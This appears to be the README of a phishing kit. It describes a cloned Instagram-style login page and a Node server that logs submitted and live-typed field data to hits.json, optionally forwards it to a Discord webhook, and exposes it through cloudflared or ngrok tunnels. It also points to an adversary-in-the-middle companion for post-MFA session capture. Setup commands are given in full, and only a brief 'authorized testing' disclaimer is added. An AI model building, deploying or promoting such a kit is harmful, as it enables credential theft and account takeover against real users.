<p align="center">
  <img src="assets/logo.svg" width="128" alt="Login UI Lab">
</p>

<h1 align="center">Login UI Lab</h1>

<p align="center">
  <b>Pixel-accurate social login UI + zero-dependency Node server</b><br>
  Windows · macOS · Linux · Termux · iSH · instant public tunnels
</p>

<p align="center">
  <img alt="Node" src="https://img.shields.io/badge/node-%3E%3D18-brightgreen?style=for-the-badge&logo=node.js&logoColor=white">
  <img alt="Platforms" src="https://img.shields.io/badge/platforms-Win%20%7C%20Mac%20%7C%20Linux%20%7C%20Android%20%7C%20iOS-blue?style=for-the-badge">
  <img alt="Deps" src="https://img.shields.io/badge/dependencies-0-success?style=for-the-badge">
  <img alt="License" src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge">
  <a href="https://github.com/zenzemie/login-ui-lab/stargazers"><img alt="Stars" src="https://img.shields.io/github/stars/zenzemie/login-ui-lab?style=for-the-badge"></a>
</p>

---

## What is this?

A working recreation of a modern social login screen (system light/dark, floating fields, optional confirmation step) plus a single-file Node server.

- Serves the UI
- Accepts form / live field events
- Stores events locally (`hits.json`)
- Optional Discord notify via `DISCORD_WEBHOOK`
- Runs on every common platform with Node

Optional **AiTM notes** (session / MFA context) live in [`aitm/`](./aitm/) and do not change the default flow.

---

## Quick start

```bash
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

Open http://127.0.0.1:8080

Public link:

```bash
cloudflared tunnel --url http://127.0.0.1:8080
# or: ngrok http 8080
```

Optional notify:

```bash
export DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
node server.js
```

---

## Platforms

| Platform | Notes |
|----------|--------|
| Windows | `start-windows.bat` or `node server.js` |
| macOS / Linux | `./start.sh` or `node server.js` |
| Termux | `pkg install nodejs cloudflared git` |
| iSH | `apk add nodejs npm git` |

---

## Themes

Uses `prefers-color-scheme`:

- **Light** — classic web login layout
- **Dark** — mobile-style layout closer to current Instagram dark login

---

## AiTM companion

See [`aitm/README.md`](./aitm/README.md) for adversary-in-the-middle / post-MFA session context.  
The default `node server.js` path is unchanged.

---

## Disclaimer

Educational and front-end / security-lab use on systems you own or are authorized to test. MIT licensed.

---

## License

MIT © zenzemie
